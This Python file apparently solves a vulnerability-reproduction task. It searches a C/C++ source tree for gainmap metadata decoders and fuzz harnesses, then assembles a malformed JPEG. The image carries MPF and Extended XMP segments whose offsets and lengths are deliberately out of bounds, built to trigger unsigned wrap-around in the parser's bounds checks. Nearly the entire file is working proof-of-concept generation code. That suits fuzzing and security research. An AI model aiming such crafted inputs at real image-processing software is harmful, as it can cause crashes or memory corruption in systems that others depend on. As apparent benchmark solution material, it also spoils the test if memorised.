import os
import re
import struct
import tarfile
from typing import Dict, Iterable, Optional, Tuple


def _u16be(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def _u32be(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def _u16le(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _u32le(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _jpeg_segment(marker_2bytes: bytes, payload: bytes) -> bytes:
    ln = len(payload) + 2
    if ln > 0xFFFF:
        payload = payload[: 0xFFFF - 2]
        ln = 0xFFFF
    return marker_2bytes + _u16be(ln) + payload


def _make_mpf_payload(mpf_entry_offset: int = 64) -> bytes:
    # APP2 payload: "MPF\0" + TIFF header
    # TIFF (little-endian):
    # - IFD0 has:
    #   - MPFVersion (B000) = "0100"
    #   - NumberOfImages (B001) = 2
    #   - MPEntry (B002) count 32, offset points out-of-bounds (to trigger unsigned underflow checks)
    tiff = b"II" + _u16le(42) + _u32le(8)
    ifd_entries = []

    # MPFVersion: tag B000, type UNDEFINED(7), count 4, value "0100"
    ifd_entries.append(_u16le(0xB000) + _u16le(7) + _u32le(4) + b"0100")
    # NumberOfImages: tag B001, type LONG(4), count 1, value 2
    ifd_entries.append(_u16le(0xB001) + _u16le(4) + _u32le(1) + _u32le(2))
    # MPEntry: tag B002, type UNDEFINED(7), count 32, value offset (out of bounds)
    ifd_entries.append(_u16le(0xB002) + _u16le(7) + _u32le(32) + _u32le(mpf_entry_offset))

    ifd = _u16le(len(ifd_entries)) + b"".join(ifd_entries) + _u32le(0)
    return b"MPF\x00" + tiff + ifd


def _make_xmp_primary_payload(guid32_ascii: bytes) -> bytes:
    # APP1 XMP (standard): identifier + minimal XML that references the extended XMP GUID
    xap_id = b"http://ns.adobe.com/xap/1.0/\x00"
    # Keep relatively small but include HasExtendedXMP string with the GUID
    xml = (
        b'<x:xmpmeta><rdf:RDF><rdf:Description xmlns:xmpNote="http://ns.adobe.com/xmp/note/" '
        b'xmpNote:HasExtendedXMP="'
        + guid32_ascii
        + b'"/></rdf:RDF></x:xmpmeta>'
    )
    return xap_id + xml


def _make_xmp_ext_payload(guid32_ascii: bytes, total_len: int = 1, offset: int = 2, chunk: bytes = b"A") -> bytes:
    # APP1 Extended XMP: identifier + GUID + total length (BE) + offset (BE) + chunk
    # Set offset > total length to trigger unsigned wrap-around in bounds calculations.
    ext_id = b"http://ns.adobe.com/xmp/extension/\x00"
    if len(guid32_ascii) != 32:
        guid32_ascii = (guid32_ascii + b"0" * 32)[:32]
    return ext_id + guid32_ascii + _u32be(total_len) + _u32be(offset) + chunk


def _make_minimal_grayscale_jpeg_base() -> bytes:
    # Minimal 1x1 grayscale baseline JPEG with tiny Huffman tables.
    # SOI
    out = bytearray(b"\xFF\xD8")

    # DQT: one table id 0, all ones
    dqt_payload = b"\x00" + (b"\x01" * 64)
    out += _jpeg_segment(b"\xFF\xDB", dqt_payload)

    # SOF0: 8-bit, 1x1, 1 component
    sof0_payload = b"\x08" + _u16be(1) + _u16be(1) + b"\x01" + b"\x01" + b"\x11" + b"\x00"
    out += _jpeg_segment(b"\xFF\xC0", sof0_payload)

    # DHT: DC0 and AC0, each with one symbol (len=1)
    bits = bytes([1] + [0] * 15)
    dht_dc0 = b"\x00" + bits + b"\x00"  # category 0
    dht_ac0 = b"\x10" + bits + b"\x00"  # EOB
    out += _jpeg_segment(b"\xFF\xC4", dht_dc0 + dht_ac0)

    # SOS: 1 component, use tables 0/0
    sos_payload = b"\x01" + b"\x01" + b"\x00" + b"\x00" + b"\x3F" + b"\x00"
    out += _jpeg_segment(b"\xFF\xDA", sos_payload)

    # Entropy-coded data: DC(0) + EOB, then pad with 1s -> 0x3F
    out += b"\x3F"

    # EOI
    out += b"\xFF\xD9"
    return bytes(out)


def _insert_segments_after_soi(jpeg_base: bytes, segments: Iterable[bytes]) -> bytes:
    if not jpeg_base.startswith(b"\xFF\xD8"):
        return jpeg_base
    return b"\xFF\xD8" + b"".join(segments) + jpeg_base[2:]


def _iter_project_files(src_path: str) -> Iterable[Tuple[str, int, callable]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                full = os.path.join(root, fn)
                try:
                    st = os.stat(full)
                except OSError:
                    continue

                def _opener(p=full):
                    return open(p, "rb")

                rel = os.path.relpath(full, src_path)
                yield rel, st.st_size, _opener
        return

    # Assume tarball
    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return

    with tf:
        for m in tf.getmembers():
            if not m.isreg():
                continue

            def _opener(member=m):
                return tf.extractfile(member)

            yield m.name, m.size, _opener


def _analyze_source(src_path: str) -> Dict[str, bool]:
    flags = {
        "mpf": False,
        "xmp_ext": False,
        "xmp_has": False,
        "direct_fuzzer": False,
        "jpegish_fuzzer": False,
        "found_decode_fn": False,
        "decode_fn_mpf": False,
        "decode_fn_xmp": False,
    }

    code_exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".mm", ".m")
    max_file = 1_500_000
    max_total = 80_000_000
    total = 0

    priority_re = re.compile(r"(gainmap|xmp|mpf|jpeg|codec|fuzz|fuzzer)", re.IGNORECASE)
    decode_re = re.compile(rb"decode\s*gainmap\s*metadata", re.IGNORECASE)

    # First prioritized pass
    files = list(_iter_project_files(src_path))

    def scan_file(name: str, size: int, opener) -> None:
        nonlocal total
        if total >= max_total:
            return
        try:
            f = opener()
            if f is None:
                return
            with f:
                data = f.read(min(size, max_file))
        except Exception:
            return

        total += len(data)
        lb = data.lower()

        if b"decodegainmapmetadata" in lb or decode_re.search(data) is not None:
            flags["found_decode_fn"] = True
            snippet = lb
            if b"mpf\\0" in snippet or b"mpf\x00" in data or b"0xb002" in snippet or b"mp entry" in snippet:
                flags["decode_fn_mpf"] = True
            if b"http://ns.adobe.com/xmp/extension" in snippet or b"hasextendedxmp" in snippet or b"xmp/extension" in snippet:
                flags["decode_fn_xmp"] = True

        if b"http://ns.adobe.com/xmp/extension" in lb or b"xmp/extension" in lb:
            flags["xmp_ext"] = True
        if b"hasextendedxmp" in lb:
            flags["xmp_has"] = True

        if (b"mpf\\0" in lb) or (b"0xb002" in lb) or (b"mp entry" in lb) or (b"multi-picture" in lb) or (b"multipicture" in lb):
            flags["mpf"] = True

        if b"llvmfuzzertestoneinput" in lb:
            if b"decodegainmapmetadata" in lb and (b"fuzzeddataprovider" in lb) and (b"skcodec" not in lb) and (b"jpeg" not in lb):
                flags["direct_fuzzer"] = True
            if b"skcodec" in lb or b"jpeg_read_header" in lb or b"skjpeg" in lb or b"libjpeg" in lb:
                flags["jpegish_fuzzer"] = True

    # pass 1: prioritized names
    for name, size, opener in files:
        if total >= max_total:
            break
        if not name.lower().endswith(code_exts):
            continue
        if size <= 0 or size > max_file:
            continue
        if priority_re.search(name) is None:
            continue
        scan_file(name, size, opener)

    # pass 2: broader, stop early if we have enough signal
    for name, size, opener in files:
        if total >= max_total:
            break
        if not name.lower().endswith(code_exts):
            continue
        if size <= 0 or size > max_file:
            continue

        if flags["found_decode_fn"] and (flags["mpf"] or flags["xmp_ext"] or flags["xmp_has"]) and (flags["direct_fuzzer"] or flags["jpegish_fuzzer"]):
            break
        scan_file(name, size, opener)

    # If decode function snippet suggested a specific mechanism, prefer that
    if flags["decode_fn_mpf"]:
        flags["mpf"] = True
    if flags["decode_fn_xmp"]:
        flags["xmp_ext"] = True

    return flags


class Solution:
    def solve(self, src_path: str) -> bytes:
        flags = _analyze_source(src_path)

        guid = b"0123456789ABCDEF0123456789ABCDEF"

        want_mpf = flags["mpf"] or (not flags["xmp_ext"] and not flags["xmp_has"])
        want_xmp = flags["xmp_ext"] or flags["xmp_has"]

        # Determine if input is likely raw bytes passed directly to decodeGainmapMetadata
        input_kind = "jpeg"
        if flags["direct_fuzzer"] and not flags["jpegish_fuzzer"]:
            input_kind = "raw"

        if input_kind == "raw":
            if want_mpf:
                return _make_mpf_payload(mpf_entry_offset=64)
            if want_xmp:
                return _make_xmp_ext_payload(guid, total_len=1, offset=2, chunk=b"A")
            return _make_mpf_payload(mpf_entry_offset=64)

        # JPEG-wrapped PoC
        base = _make_minimal_grayscale_jpeg_base()
        segments = []

        if want_xmp:
            # Include primary XMP only if repo indicates HasExtendedXMP usage (more likely to be processed)
            if flags["xmp_has"]:
                segments.append(_jpeg_segment(b"\xFF\xE1", _make_xmp_primary_payload(guid)))
            segments.append(_jpeg_segment(b"\xFF\xE1", _make_xmp_ext_payload(guid, total_len=1, offset=2, chunk=b"A")))

        if want_mpf:
            segments.append(_jpeg_segment(b"\xFF\xE2", _make_mpf_payload(mpf_entry_offset=64)))

        if not segments:
            segments.append(_jpeg_segment(b"\xFF\xE2", _make_mpf_payload(mpf_entry_offset=64)))

        return _insert_segments_after_soi(base, segments)